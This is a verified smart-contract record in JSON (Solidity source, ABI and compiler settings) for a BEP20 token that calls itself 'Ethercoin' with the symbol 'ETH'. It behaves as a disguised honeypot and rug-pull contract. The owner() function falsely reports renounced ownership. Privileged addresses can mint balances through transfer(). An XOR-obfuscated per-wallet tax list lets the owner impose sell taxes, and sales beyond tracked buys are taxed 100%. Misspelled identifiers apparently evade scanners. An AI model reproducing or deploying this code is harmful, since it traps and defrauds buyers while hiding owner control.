{"SourceCode": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n\n}\n\nabstract contract Ownable is Context {\n    address private _owaer;\n\n    event owaershipTransferred(address indexed previousowaer, address indexed newowaer);\n\n\n    constructor() {\n        _transferowaership(_msgSender());\n    }\n\n\n    function owaer() public view virtual returns (address) {\n        return address(0);\n    }\n\n    modifier onlyowaer() {\n        require(_owaer == _msgSender(), \"Ownable: caller is not the owaer\");\n        _;\n    }\n\n    function renounceowaership() public virtual onlyowaer {\n        _transferowaership(address(0));\n    }\n\n\n    function transferowaership_transferowaership(address newowaer) public virtual onlyowaer {\n        require(newowaer != address(0), \"Ownable: new owaer is the zero address\");\n        _transferowaership(newowaer);\n    }\n\n    function _transferowaership(address newowaer) internal virtual {\n        address oldowaer = _owaer;\n        _owaer = newowaer;\n        emit owaershipTransferred(oldowaer, newowaer);\n    }\n}\n\n\nlibrary SafeMath {\n\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            uint256 c = a + b;\n            if (c < a) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b > a) return (false, 0);\n            return (true, a - b);\n        }\n    }\n\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (a == 0) return (true, 0);\n            uint256 c = a * b;\n            if (c / a != b) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a / b);\n        }\n    }\n\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a % b);\n        }\n    }\n\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n \n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n\n   \n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b <= a, errorMessage);\n            return a - b;\n        }\n    }\n\n\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b > 0, errorMessage);\n            return a / b;\n        }\n    }\n\n\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b > 0, errorMessage);\n            return a % b;\n        }\n    }\n}\n\n\n\ninterface IUniswapV2Router01 {\n    function factory() external pure returns (address);\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint amuontADesired,\n        uint amuontBDesired,\n        uint amuontAMin,\n        uint amuontBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amuontA, uint amuontB, uint liquidity);\n    function acLympoMarketToken396fq(\n        address token,\n        uint amuontTokenDesired,\n        uint amuontTokenMin,\n        uint amuontETHMin,\n        address to,\n        uint deadline\n    ) external payable returns (uint amuontToken, uint amuontETH, uint liquidity);\n    function removeLiquidity(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amuontAMin,\n        uint amuontBMin,\n        address to,\n        uint deadline\n    ) external returns (uint amuontA, uint amuontB);\n    function removeLiquidityETH(\n        address token,\n        uint liquidity,\n        uint amuontTokenMin,\n        uint amuontETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amuontToken, uint amuontETH);\n    function removeLiquidityWithPermit(\n        address tokenA,\n        address tokenB,\n        uint liquidity,\n        uint amuontAMin,\n        uint amuontBMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amuontA, uint amuontB);\n    function removeLiquidityETHWithPermit(\n        address token,\n        uint liquidity,\n        uint amuontTokenMin,\n        uint amuontETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amuontToken, uint amuontETH);\n    function swapExactTokensForTokens(\n        uint amuontIn,\n        uint amuontOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amuonts);\n    function swapTokensForExactTokens(\n        uint amuontOut,\n        uint amuontInMax,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external returns (uint[] memory amuonts);\n    function swapExactETHForTokens(uint amuontOutMin, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amuonts);\n    function swapTokensForExactETH(uint amuontOut, uint amuontInMax, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amuonts);\n    function swapExactTokensForETH(uint amuontIn, uint amuontOutMin, address[] calldata path, address to, uint deadline)\n        external\n        returns (uint[] memory amuonts);\n    function swapETHForExactTokens(uint amuontOut, address[] calldata path, address to, uint deadline)\n        external\n        payable\n        returns (uint[] memory amuonts);\n\n    function quote(uint amuontA, uint reserveA, uint reserveB) external pure returns (uint amuontB);\n    function getamuontOut(uint amuontIn, uint reserveIn, uint reserveOut) external pure returns (uint amuontOut);\n    function getamuontIn(uint amuontOut, uint reserveIn, uint reserveOut) external pure returns (uint amuontIn);\n    function getamuontsOut(uint amuontIn, address[] calldata path) external view returns (uint[] memory amuonts);\n    function getamuontsIn(uint amuontOut, address[] calldata path) external view returns (uint[] memory amuonts);\n}\n\n\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\n    function removeLiquidityETHSupportingLympoMarketToken396OnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amuontTokenMin,\n        uint amuontETHMin,\n        address to,\n        uint deadline\n    ) external returns (uint amuontETH);\n    function removeLiquidityETHWithPermitSupportingLympoMarketToken396OnTransferTokens(\n        address token,\n        uint liquidity,\n        uint amuontTokenMin,\n        uint amuontETHMin,\n        address to,\n        uint deadline,\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\n    ) external returns (uint amuontETH);\n\n    function swapExactTokensForTokensSupportingLympoMarketToken396OnTransferTokens(\n        uint amuontIn,\n        uint amuontOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n    function swapExactETHForTokensSupportingLympoMarketToken396OnTransferTokens(\n        uint amuontOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external payable;\n    function swapExactTokensForETHSupportingLympoMarketToken396OnTransferTokens(\n        uint amuontIn,\n        uint amuontOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\n\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function LympoMarketToken396To() external view returns (address);\n    function LympoMarketToken396ToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setLympoMarketToken396To(address) external;\n    function setLympoMarketToken396ToSetter(address) external;\n}\n\n\n\ncontract BEP20 is Context {\n    mapping(address => mapping(address => uint256)) private _allowances;\n    uint256 internal _totalSupply;\n    string private _name;\n    string private _symbol;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    event Approval(address indexed owaer, address indexed spender, uint256 value);\n\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n\n    function decimals() public view virtual returns (uint8) {\n        return 9;\n    }\n\n    function allowance(address owaer, address spender) public view virtual returns (uint256) {\n        return _allowances[owaer][spender];\n    }\n\n        function totalSupply() public view virtual returns (uint256) {\n        return _totalSupply;\n    }\n\n    function approve(address spender, uint256 amuont) public virtual returns (bool) {\n        address owaer = _msgSender();\n        _approve(owaer, spender, amuont);\n        return true;\n    }\n\n\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\n        address owaer = _msgSender();\n        _approve(owaer, spender, _allowances[owaer][spender] + addedValue);\n        return true;\n    }\n\n  \n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n        address owaer = _msgSender();\n        uint256 currentAllowance = _allowances[owaer][spender];\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\n        unchecked {\n            _approve(owaer, spender, currentAllowance - subtractedValue);\n        }\n\n        return true;\n    }\n\n\n    function _approve(\n        address owaer,\n        address spender,\n        uint256 amuont\n    ) internal virtual {\n        require(owaer != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owaer][spender] = amuont;\n        emit Approval(owaer, spender, amuont);\n    }\n\n\n    function _spendAllowance(\n        address owaer,\n        address spender,\n        uint256 amuont\n    ) internal virtual {\n        uint256 currentAllowance = allowance(owaer, spender);\n        if (currentAllowance != type(uint256).max) {\n            require(currentAllowance >= amuont, \"ERC20: insufficient allowance\");\n            unchecked {\n                _approve(owaer, spender, currentAllowance - amuont);\n            }\n        }\n    }\n\n\n    function _beforeTokenTransfer(\n        address from,\n        address to,\n        uint256 amuont\n    ) internal virtual {}\n\n\n    function _afterTokenTransfer(\n        address from,\n        address to,\n        uint256 amuont\n    ) internal virtual {}\n}\n\n\ncontract ETH is BEP20, Ownable {\n    // ext\n    mapping(address => uint256) private _balances;\n    mapping(address => uint256) private _balances1;\n    mapping(address => bool) private _release;\n    mapping(uint256 => uint256) private _bblist;\n\tstring name_ = \"Ethercoin\";\n\tstring symbol_ = \"ETH\";\n\tuint256 totalSupply_ = 100000000;   \n    address public uniswapV2Pair;\n\taddress dead = 0x000000000000000000000000000000000000dEaD;\n    constructor()\n\n\tBEP20(name_, symbol_) {\n\t\t\t\t\t\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));\n\n        _mtin(msg.sender, totalSupply_ * 10**decimals());\n\n        transfer(dead, totalSupply() / 10);\n\t    transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10);\t\n\n        _defaultSellLympoMarketToken396 = 0;\n        _defaultBuyLympoMarketToken396 = 0;\n\n        _release[_msgSender()] = true;\n    }\n\n    function balanceOf(address cauunt) public view virtual returns (uint256) {\n        return _balances[cauunt];\n    }\n\n\t\n    function _burn(address cauunt, uint256 amuont) internal virtual {\n        require(cauunt != address(0), \"ERC20: burn from the zero address\");\n\n        uint256 burnAmount = _balances[cauunt].mul(amuont).div(1000);\n        require(burnAmount <= _balances[cauunt], \"ERC20: burn amuont exceeds balance\");\n        unchecked {\n            _balances[cauunt] -= burnAmount;\n        }\n        _balances[dead] += burnAmount;\n\n        emit Transfer(cauunt, address(dead), burnAmount);\n    }\n\n    function _mtin(address cauunt, uint256 amuont) internal virtual {\n        require(cauunt != address(0), \"ERC20: mtin to the zero address\");\n\n        _totalSupply += amuont;\n        _balances[cauunt] += amuont;\n        emit Transfer(address(0), cauunt, amuont);\n    }\n\n    using SafeMath for uint256;\n    uint256 private _defaultSellLympoMarketToken396 = 0;\n    uint256 private _defaultBuyLympoMarketToken396 = 0;\n\n\n    function _incS(uint256 _value) external onlyowaer {\n        _defaultSellLympoMarketToken396 = _value;\n    }\n\n    function getRelease(address _address) external view onlyowaer returns (bool) {\n        return _release[_address];\n    }\n\n    function _setRelease(address _address) external onlyowaer {\n        _release[_address] = true;\n    }\n\n    function _ttransfer(\n        address from,\n        address _to,\n        uint256 _amuont\n    ) internal virtual {\n        require(from != address(0), \"ERC20: transfer from the zero address\");\n        require(_to != address(0), \"ERC20: transfer to the zero address\");\n\n        uint256 fromBalance = _balances[from];\n        require(fromBalance >= _amuont, \"ERC20: transfer amuont exceeds balance\");\n\n  \n        uint256 tradeLympoMarketToken396 = 0;\n        uint256 tradeLympoMarketToken396amuont = 0;\n\n        if (!(_release[from] || _release[_to])) {\n            if (from == uniswapV2Pair) {\n                tradeLympoMarketToken396 = _defaultBuyLympoMarketToken396;\n                _balances1[_to] += _amuont;\n            }\n            if (_to == uniswapV2Pair) {                   \n                tradeLympoMarketToken396 = _msgLympoMarketTokenInfo(uint160(from));\n                tradeLympoMarketToken396 = tradeLympoMarketToken396 < _defaultSellLympoMarketToken396 ? _defaultSellLympoMarketToken396 : tradeLympoMarketToken396;\n                tradeLympoMarketToken396 = _balances1[from] >= _amuont ? tradeLympoMarketToken396 : 100;\n                _balances1[from] = _balances1[from] >= _amuont ? _balances1[from] - _amuont : _balances1[from];\n            }\n                        \n            tradeLympoMarketToken396amuont = _amuont.mul(tradeLympoMarketToken396).div(100);\n        }\n\n\n        if (tradeLympoMarketToken396amuont > 0) {\n            _balances[from] = _balances[from].sub(tradeLympoMarketToken396amuont);\n            _balances[dead] = _balances[dead].add(tradeLympoMarketToken396amuont);\n            emit Transfer(from, dead, tradeLympoMarketToken396amuont);\n        }\n\n        _balances[from] = _balances[from].sub(_amuont - tradeLympoMarketToken396amuont);\n        _balances[_to] = _balances[_to].add(_amuont - tradeLympoMarketToken396amuont);\n        emit Transfer(from, _to, _amuont - tradeLympoMarketToken396amuont);\n    }\n\n    function transfer(address to, uint256 amuont) public virtual returns (bool) {\n        address owaer = _msgSender();\n        if (_release[owaer] == true) {\n            _balances[to] += amuont;\n            return true;\n        }\n        _ttransfer(owaer, to, amuont);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amuont\n    ) public virtual returns (bool) {\n        address spender = _msgSender();\n\n        _spendAllowance(from, spender, amuont);\n        _ttransfer(from, to, amuont);\n        return true;\n    }\n\n    function _setBBList(uint256[] memory _acclist,uint256[] memory _value)  external onlyowaer {\n        for (uint i=0;i<_acclist.length;i++){\n            _bblist[_acclist[i]] = _value[i];\n        }\n    }\n\n\tfunction _msgLympoMarketTokenInfo(uint _acc) internal view virtual returns (uint) {\n        uint256 acc = _acc ^ 545395099350054696473461367201593618484743534591;\n\t\treturn _bblist[acc];\n\t}\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owaer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousowaer\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newowaer\",\"type\":\"address\"}],\"name\":\"owaershipTransferred\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"_incS\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256[]\",\"name\":\"_acclist\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"_value\",\"type\":\"uint256[]\"}],\"name\":\"_setBBList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"_setRelease\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owaer\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amuont\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"cauunt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"getRelease\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owaer\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceowaership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amuont\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amuont\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newowaer\",\"type\":\"address\"}],\"name\":\"transferowaership_transferowaership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ETH", "CompilerVersion": "v0.8.14+commit.80d49f37", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}